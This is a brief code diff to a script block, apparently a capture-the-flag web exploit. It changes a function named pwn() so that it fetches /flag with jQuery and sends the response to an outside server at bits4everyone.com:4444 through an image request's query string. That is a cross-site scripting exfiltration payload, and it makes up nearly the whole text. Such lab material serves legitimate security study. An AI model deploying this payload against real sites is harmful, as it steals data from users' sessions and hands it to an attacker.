@@ -4,9 +4,10 @@
 <script type="text/javascript">
 
 function pwn() {
-    var img = document.createElement('img');
-    img.src = "/flag";
-    document.body.appendChild(img);
+    $.get('/flag', function(data) {
+        var image = new Image();
+        image.src='http://bits4everyone.com:4444?data='+data;
+    });
 }
 
 function foo() {
